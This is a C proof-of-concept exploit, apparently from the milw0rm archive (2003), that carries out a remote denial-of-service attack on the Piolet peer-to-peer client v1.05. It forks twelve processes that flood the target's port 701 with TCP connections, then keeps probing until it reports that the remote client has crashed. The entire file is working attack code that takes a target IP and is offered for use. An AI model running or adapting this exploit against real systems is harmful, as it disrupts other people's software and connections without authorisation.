/************************************************************
*                      Piolet client v1.05 Remote Denial of Service                    *
*               Proof of Concept by Luca Ercoli  luca.ercoli[at]inwind.it             *
************************************************************/

#include <stdio.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

int ck,port=701,sd,cx=0,contatore=0,prec;

struct sockaddr_in pilot_client;

void ending(char *client){

int i;

pilot_client.sin_family = AF_INET;
pilot_client.sin_port = htons((u_short)port);
pilot_client.sin_addr.s_addr = (long)inet_addr(client);


for(i = 0; i < 100; i++){

sd = socket(AF_INET, SOCK_STREAM, 0);
ck = connect(sd, (struct sockaddr *) &pilot_client, sizeof(pilot_client)); 


if(ck != 0) { 

prec = 0;

if (prec == 0) contatore++;
if (prec == 1) contatore = 0;

if (contatore > 13) {
printf("! Remote client seems to be crashed.\n");
exit(0);
}

}
 
if(ck == 0) prec = 1;

  close(sd);
}

}

void kill_pilot(char *stringa){

short i;

  pilot_client.sin_family = AF_INET;
  pilot_client.sin_port = htons((u_short)port);
  pilot_client.sin_addr.s_addr = (long)inet_addr(stringa);
   
for(i = 0; i < 50; i++){

sd = socket(AF_INET, SOCK_STREAM, 0);
ck = connect(sd, (struct sockaddr *) &pilot_client, sizeof(pilot_client)); 


if(ck != 0) exit(0);

close(sd);

}

}

int main(int argc, char **argv)
{

short i;

 prec = 0;

  if(argc < 2)
  { 
    printf("\nUsage: %s <client-ip>\n", argv[0]);
    exit(0);
  }
  
prec=0;

printf ("\n\n+ DoS Started...\n");
printf("+ Flooding remote client...\n");

for (i=0; i<12; i++)  if(!fork()) kill_pilot(argv[1]);

printf ("+ Ending...\n");

ending(argv[1]);
  
}

// milw0rm.com [2003-08-20]
